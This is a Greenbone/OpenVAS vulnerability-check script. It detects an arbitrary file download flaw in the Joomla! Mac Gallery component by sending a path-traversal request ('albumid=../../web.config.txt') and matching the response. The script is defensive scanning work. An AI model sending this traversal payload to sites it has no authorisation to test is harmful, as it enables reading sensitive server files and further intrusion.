CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804772" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2014-10-07 11:56:04 +0530 (Tue, 07 Oct 2014)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "Joomla! Mac Gallery Component Arbitrary File Download Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with Joomla! Mac
  Gallery Component and is prone to arbitrary file download vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to download arbitrary file or not." );
	script_tag( name: "insight", value: "Flaw is due to the index.php script not
  properly sanitizing user-supplied input specifically path traversal style
  attacks (e.g. '../') to the 'albumid' parameter." );
	script_tag( name: "impact", value: "Successful exploitation may allow an attacker
  to obtain sensitive information, which can lead to launching further attacks." );
	script_tag( name: "affected", value: "Joomla! Mac Gallery Component version 1.5
  and prior." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/34755" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/128341" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "joomla_detect.sc" );
	script_mandatory_keys( "joomla/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php?option=com_macgallery&view=download&albumid=../../web.config.txt";
if(http_vuln_check( port: http_port, url: url, check_header: FALSE, pattern: "<configuration>", extra_check: "Joomla! Rule" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}
exit( 99 );

